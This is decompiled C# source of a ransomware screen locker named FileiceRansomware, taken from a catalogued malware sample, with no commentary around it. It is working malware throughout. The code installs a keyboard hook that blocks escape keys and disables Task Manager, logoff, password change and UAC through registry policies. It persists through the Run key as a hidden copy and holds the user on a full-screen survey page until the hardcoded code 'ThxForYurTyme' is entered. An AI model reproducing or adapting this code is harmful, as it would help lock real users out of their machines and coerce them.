// Decompiled with JetBrains decompiler
// Type: FileiceRansomware.Form1
// Assembly: FileiceRansomware, Version=1.0.3.9, Culture=neutral, PublicKeyToken=null
// MVID: D842FFB8-D8DE-4178-93F9-A1A5D7AA56CC
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00080-msil\Trojan-Ransom.MSIL.Blocker.ag-61482c8f71ac8cad9cbf4a07eb97fd410d4ec5ff5373a25abf73f771d1d7c353.exe

using FileiceRansomware.My;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.Win32;
using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Windows.Forms;

namespace FileiceRansomware
{
  [DesignerGenerated]
  public class Form1 : Form
  {
    private IContainer components;
    [AccessedThroughProperty("GroupBox1")]
    private GroupBox _GroupBox1;
    [AccessedThroughProperty("TabControl1")]
    private TabControl _TabControl1;
    [AccessedThroughProperty("SurveyList")]
    private TabPage _SurveyList;
    [AccessedThroughProperty("TabPage3")]
    private TabPage _TabPage3;
    [AccessedThroughProperty("Label1")]
    private Label _Label1;
    [AccessedThroughProperty("TxtUnlock")]
    private TextBox _TxtUnlock;
    [AccessedThroughProperty("BtnUnlock")]
    private Button _BtnUnlock;
    [AccessedThroughProperty("MenuStrip1")]
    private MenuStrip _MenuStrip1;
    [AccessedThroughProperty("TestToolStripMenuItem")]
    private ToolStripMenuItem _TestToolStripMenuItem;
    [AccessedThroughProperty("wb")]
    private eWebbrowser _wb;
    private const int WH_KEYBOARD_LL = 13;
    private IntPtr intLLKey;

    public Form1()
    {
      this.Load += new EventHandler(this.Form1_Load);
      this.InitializeComponent();
    }

    [DebuggerNonUserCode]
    protected override void Dispose(bool disposing)
    {
      try
      {
        if (!disposing || this.components == null)
          return;
        this.components.Dispose();
      }
      finally
      {
        base.Dispose(disposing);
      }
    }

    [DebuggerStepThrough]
    private void InitializeComponent()
    {
      this.GroupBox1 = new GroupBox();
      this.Label1 = new Label();
      this.TxtUnlock = new TextBox();
      this.BtnUnlock = new Button();
      this.TabControl1 = new TabControl();
      this.SurveyList = new TabPage();
      this.TabPage3 = new TabPage();
      this.MenuStrip1 = new MenuStrip();
      this.TestToolStripMenuItem = new ToolStripMenuItem();
      this.GroupBox1.SuspendLayout();
      this.TabControl1.SuspendLayout();
      this.TabPage3.SuspendLayout();
      this.MenuStrip1.SuspendLayout();
      this.SuspendLayout();
      this.GroupBox1.Controls.Add((Control) this.Label1);
      this.GroupBox1.Controls.Add((Control) this.TxtUnlock);
      this.GroupBox1.Controls.Add((Control) this.BtnUnlock);
      GroupBox groupBox1_1 = this.GroupBox1;
      Point point1 = new Point(8, 6);
      Point point2 = point1;
      groupBox1_1.Location = point2;
      this.GroupBox1.Name = "GroupBox1";
      GroupBox groupBox1_2 = this.GroupBox1;
      Size size1 = new Size(391, 193);
      Size size2 = size1;
      groupBox1_2.Size = size2;
      this.GroupBox1.TabIndex = 7;
      this.GroupBox1.TabStop = false;
      this.GroupBox1.Text = "Unlock Box";
      Label label1_1 = this.Label1;
      point1 = new Point(225, 14);
      Point point3 = point1;
      label1_1.Location = point3;
      this.Label1.Name = "Label1";
      Label label1_2 = this.Label1;
      size1 = new Size(149, 149);
      Size size3 = size1;
      label1_2.Size = size3;
      this.Label1.TabIndex = 8;
      this.Label1.Text = "When the survey is completed and the download unlocks, type the \"filename\" of the locked file to unlock your PC.";
      this.Label1.TextAlign = ContentAlignment.MiddleCenter;
      TextBox txtUnlock1 = this.TxtUnlock;
      point1 = new Point(22, 60);
      Point point4 = point1;
      txtUnlock1.Location = point4;
      this.TxtUnlock.Name = "TxtUnlock";
      TextBox txtUnlock2 = this.TxtUnlock;
      size1 = new Size(185, 26);
      Size size4 = size1;
      txtUnlock2.Size = size4;
      this.TxtUnlock.TabIndex = 7;
      Button btnUnlock1 = this.BtnUnlock;
      point1 = new Point(22, 94);
      Point point5 = point1;
      btnUnlock1.Location = point5;
      this.BtnUnlock.Name = "BtnUnlock";
      Button btnUnlock2 = this.BtnUnlock;
      size1 = new Size(185, 33);
      Size size5 = size1;
      btnUnlock2.Size = size5;
      this.BtnUnlock.TabIndex = 6;
      this.BtnUnlock.Text = "Unlock PC";
      this.BtnUnlock.UseVisualStyleBackColor = true;
      this.TabControl1.Controls.Add((Control) this.SurveyList);
      this.TabControl1.Controls.Add((Control) this.TabPage3);
      this.TabControl1.Dock = DockStyle.Fill;
      this.TabControl1.Font = new Font("Lucida Sans", 12f, FontStyle.Bold, GraphicsUnit.Point, (byte) 0);
      TabControl tabControl1_1 = this.TabControl1;
      point1 = new Point(0, 0);
      Point point6 = point1;
      tabControl1_1.Location = point6;
      this.TabControl1.Name = "TabControl1";
      this.TabControl1.SelectedIndex = 0;
      TabControl tabControl1_2 = this.TabControl1;
      size1 = new Size(534, 508);
      Size size6 = size1;
      tabControl1_2.Size = size6;
      this.TabControl1.TabIndex = 8;
      this.SurveyList.Font = new Font("Modern No. 20", 18f, FontStyle.Bold, GraphicsUnit.Point, (byte) 0);
      TabPage surveyList1 = this.SurveyList;
      point1 = new Point(4, 27);
      Point point7 = point1;
      surveyList1.Location = point7;
      this.SurveyList.Name = "SurveyList";
      TabPage surveyList2 = this.SurveyList;
      Padding padding1 = new Padding(3);
      Padding padding2 = padding1;
      surveyList2.Padding = padding2;
      TabPage surveyList3 = this.SurveyList;
      size1 = new Size(526, 477);
      Size size7 = size1;
      surveyList3.Size = size7;
      this.SurveyList.TabIndex = 0;
      this.SurveyList.Text = "Select Your Survey";
      this.SurveyList.UseVisualStyleBackColor = true;
      this.TabPage3.Controls.Add((Control) this.GroupBox1);
      TabPage tabPage3_1 = this.TabPage3;
      point1 = new Point(4, 27);
      Point point8 = point1;
      tabPage3_1.Location = point8;
      this.TabPage3.Name = "TabPage3";
      TabPage tabPage3_2 = this.TabPage3;
      padding1 = new Padding(3);
      Padding padding3 = padding1;
      tabPage3_2.Padding = padding3;
      TabPage tabPage3_3 = this.TabPage3;
      size1 = new Size(526, 477);
      Size size8 = size1;
      tabPage3_3.Size = size8;
      this.TabPage3.TabIndex = 2;
      this.TabPage3.Text = "Unlock Your PC";
      this.TabPage3.UseVisualStyleBackColor = true;
      this.MenuStrip1.Items.AddRange(new ToolStripItem[1]
      {
        (ToolStripItem) this.TestToolStripMenuItem
      });
      MenuStrip menuStrip1_1 = this.MenuStrip1;
      point1 = new Point(0, 0);
      Point point9 = point1;
      menuStrip1_1.Location = point9;
      this.MenuStrip1.Name = "MenuStrip1";
      MenuStrip menuStrip1_2 = this.MenuStrip1;
      size1 = new Size(534, 24);
      Size size9 = size1;
      menuStrip1_2.Size = size9;
      this.MenuStrip1.TabIndex = 9;
      this.MenuStrip1.Text = "MenuStrip1";
      this.MenuStrip1.Visible = false;
      this.TestToolStripMenuItem.Name = "TestToolStripMenuItem";
      this.TestToolStripMenuItem.ShortcutKeys = Keys.F4 | Keys.Alt;
      ToolStripMenuItem toolStripMenuItem = this.TestToolStripMenuItem;
      size1 = new Size(38, 20);
      Size size10 = size1;
      toolStripMenuItem.Size = size10;
      this.TestToolStripMenuItem.Text = "test";
      this.TestToolStripMenuItem.Visible = false;
      this.AutoScaleDimensions = new SizeF(6f, 13f);
      this.AutoScaleMode = AutoScaleMode.Font;
      this.BackColor = System.Drawing.Color.Black;
      size1 = new Size(534, 508);
      this.ClientSize = size1;
      this.ControlBox = false;
      this.Controls.Add((Control) this.TabControl1);
      this.Controls.Add((Control) this.MenuStrip1);
      this.FormBorderStyle = FormBorderStyle.None;
      this.MaximizeBox = false;
      this.MinimizeBox = false;
      this.Name = nameof (Form1);
      this.ShowIcon = false;
      this.ShowInTaskbar = false;
      this.Text = "XBL Tools";
      this.WindowState = FormWindowState.Maximized;
      this.GroupBox1.ResumeLayout(false);
      this.GroupBox1.PerformLayout();
      this.TabControl1.ResumeLayout(false);
      this.TabPage3.ResumeLayout(false);
      this.MenuStrip1.ResumeLayout(false);
      this.MenuStrip1.PerformLayout();
      this.ResumeLayout(false);
      this.PerformLayout();
    }

    internal virtual GroupBox GroupBox1
    {
      get => this._GroupBox1;
      [MethodImpl(MethodImplOptions.Synchronized)] set => this._GroupBox1 = value;
    }

    internal virtual TabControl TabControl1
    {
      get => this._TabControl1;
      [MethodImpl(MethodImplOptions.Synchronized)] set => this._TabControl1 = value;
    }

    internal virtual TabPage SurveyList
    {
      get => this._SurveyList;
      [MethodImpl(MethodImplOptions.Synchronized)] set => this._SurveyList = value;
    }

    internal virtual TabPage TabPage3
    {
      get => this._TabPage3;
      [MethodImpl(MethodImplOptions.Synchronized)] set => this._TabPage3 = value;
    }

    internal virtual Label Label1
    {
      get => this._Label1;
      [MethodImpl(MethodImplOptions.Synchronized)] set => this._Label1 = value;
    }

    internal virtual TextBox TxtUnlock
    {
      get => this._TxtUnlock;
      [MethodImpl(MethodImplOptions.Synchronized)] set => this._TxtUnlock = value;
    }

    internal virtual Button BtnUnlock
    {
      get => this._BtnUnlock;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.BtnUnlock_Click);
        if (this._BtnUnlock != null)
          this._BtnUnlock.Click -= eventHandler;
        this._BtnUnlock = value;
        if (this._BtnUnlock == null)
          return;
        this._BtnUnlock.Click += eventHandler;
      }
    }

    internal virtual MenuStrip MenuStrip1
    {
      get => this._MenuStrip1;
      [MethodImpl(MethodImplOptions.Synchronized)] set => this._MenuStrip1 = value;
    }

    internal virtual ToolStripMenuItem TestToolStripMenuItem
    {
      get => this._TestToolStripMenuItem;
      [MethodImpl(MethodImplOptions.Synchronized)] set => this._TestToolStripMenuItem = value;
    }

    public virtual eWebbrowser wb
    {
      get => this._wb;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        eWebbrowser.WebBrowserNewWindowExtendedEventHandler extendedEventHandler = new eWebbrowser.WebBrowserNewWindowExtendedEventHandler(this.wb_NewWindowExtended);
        CancelEventHandler cancelEventHandler = new CancelEventHandler(this.wb_NewWindow);
        if (this._wb != null)
        {
          this._wb.NewWindowExtended -= extendedEventHandler;
          this._wb.NewWindow -= cancelEventHandler;
        }
        this._wb = value;
        if (this._wb == null)
          return;
        this._wb.NewWindowExtended += extendedEventHandler;
        this._wb.NewWindow += cancelEventHandler;
      }
    }

    [DllImport("user32", EntryPoint = "SetWindowsHookExA", CharSet = CharSet.Ansi, SetLastError = true)]
    public static extern IntPtr SetWindowsHookEx(
      int idHook,
      Form1.LowLevelKeyboardProcDelegate lpfn,
      IntPtr hMod,
      int dwThreadId);

    [DllImport("user32", CharSet = CharSet.Ansi, SetLastError = true)]
    public static extern bool UnhookWindowsHookEx(IntPtr hHook);

    [DllImport("user32", CharSet = CharSet.Ansi, SetLastError = true)]
    public static extern int CallNextHookEx(
      IntPtr hHook,
      int nCode,
      int wParam,
      ref Form1.KBDLLHOOKSTRUCT lParam);

    private int LowLevelKeyboardProc(int nCode, int wParam, ref Form1.KBDLLHOOKSTRUCT lParam)
    {
      bool flag = false;
      switch (wParam)
      {
        case 256:
        case 257:
        case 260:
        case 261:
          flag = ((lParam.vkCode != 9 || lParam.flags != 32 ? 0 : 1) | (lParam.vkCode != 27 || lParam.flags != 32 ? 0 : 1) | (lParam.vkCode != 27 || lParam.flags != 0 ? 0 : 1) | (lParam.vkCode != 91 || lParam.flags != 1 ? 0 : 1) | (lParam.vkCode != 92 || lParam.flags != 1 ? 0 : 1)) != 0;
          break;
      }
      return flag ? 1 : Form1.CallNextHookEx(IntPtr.Zero, nCode, wParam, ref lParam);
    }

    private void Form1_Load(object sender, EventArgs e)
    {
      this.intLLKey = Form1.SetWindowsHookEx(13, new Form1.LowLevelKeyboardProcDelegate(this.LowLevelKeyboardProc), IntPtr.Zero, 0);
      eWebbrowser eWebbrowser = new eWebbrowser();
      this.wb = eWebbrowser;
      eWebbrowser.Dock = DockStyle.Fill;
      eWebbrowser.IsWebBrowserContextMenuEnabled = false;
      eWebbrowser.ScriptErrorsSuppressed = true;
      this.SurveyList.Controls.Add((Control) eWebbrowser);
      eWebbrowser.Navigate("http://www.fileice.net/download.php?t=regular&file=");
      RegistryKey registryKey1 = Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", true);
      RegistryKey registryKey2 = Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer", true);
      RegistryKey registryKey3 = Registry.LocalMachine.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", true);
      RegistryKey registryKey4 = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
      registryKey1.SetValue("DisableTaskMgr", (object) 1);
      registryKey1.SetValue("DisableLockWorkstation", (object) 1);
      registryKey1.SetValue("DisableChangePassword", (object) 1);
      registryKey2.SetValue("NoClose", (object) 1);
      registryKey2.SetValue("NoLogoff", (object) 1);
      registryKey3.SetValue("HideFastUserSwitching", (object) 1);
      registryKey3.SetValue("EnableLUA", (object) 0);
      registryKey4.SetValue("Sdchost", (object) "C:\\seo\\Sdchost.exe");
      registryKey1.Close();
      registryKey2.Close();
      registryKey3.Close();
      registryKey4.Close();
      try
      {
        if (File.Exists("C:\\seo\\Sdchost.exe"))
          return;
        MyProject.Computer.FileSystem.CopyFile(Application.ExecutablePath, "C:\\seo\\Sdchost.exe", true);
        File.SetAttributes("C:\\seo\\Sdchost.exe", FileAttributes.Hidden);
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        int num = (int) Interaction.MsgBox((object) "error can't add to startup");
        ProjectData.ClearProjectError();
      }
    }

    private void wb_NewWindow(object sender, CancelEventArgs e) => e.Cancel = true;

    private void wb_NewWindowExtended(
      object sender,
      eWebbrowser.WebBrowserNewWindowExtendedEventArgs e)
    {
      e.Cancel = true;
      string url = e.Url;
      TabPage tabPage = new TabPage();
      eWebbrowser eWebbrowser = new eWebbrowser();
      this.wb = eWebbrowser;
      eWebbrowser.Dock = DockStyle.Fill;
      eWebbrowser.IsWebBrowserContextMenuEnabled = false;
      eWebbrowser.ScriptErrorsSuppressed = true;
      tabPage.Text = "Survey";
      tabPage.Controls.Add((Control) eWebbrowser);
      this.TabControl1.TabPages.Add(tabPage);
      this.TabControl1.SelectedTab = tabPage;
      eWebbrowser.Navigate2(url);
    }

    private void BtnUnlock_Click(object sender, EventArgs e)
    {
      if (Operators.CompareString(this.TxtUnlock.Text, "ThxForYurTyme", false) == 0)
      {
        Form1.UnhookWindowsHookEx(this.intLLKey);
        RegistryKey registryKey1 = Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", true);
        RegistryKey registryKey2 = Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer", true);
        RegistryKey registryKey3 = Registry.LocalMachine.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", true);
        registryKey1.SetValue("DisableTaskMgr", (object) 0);
        registryKey1.SetValue("DisableLockWorkstation", (object) 0);
        registryKey1.SetValue("DisableChangePassword", (object) 0);
        registryKey2.SetValue("NoClose", (object) 0);
        registryKey2.SetValue("NoLogoff", (object) 0);
        registryKey3.SetValue("HideFastUserSwitching", (object) 0);
        registryKey1.Close();
        registryKey2.Close();
        registryKey3.Close();
        try
        {
          if (File.Exists("C:\\seo\\Sdchost.exe"))
            File.Delete("C:\\seo\\Sdchost.exe");
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          int num = (int) Interaction.MsgBox((object) "Your PC is unlocked as promised, Thanks for your time!");
          this.Close();
          ProjectData.ClearProjectError();
        }
        int num1 = (int) Interaction.MsgBox((object) "Your PC is unlocked as promised, Thanks for your time!");
        this.Close();
      }
      else
      {
        int num2 = (int) Interaction.MsgBox((object) "Invalid response, please complete a survey to proceed");
      }
    }

    public delegate int LowLevelKeyboardProcDelegate(
      int nCode,
      int wParam,
      ref Form1.KBDLLHOOKSTRUCT lParam);

    public struct KBDLLHOOKSTRUCT
    {
      public int vkCode;
      public int scanCode;
      public int flags;
      public int time;
      public int dwExtraInfo;
    }
  }
}
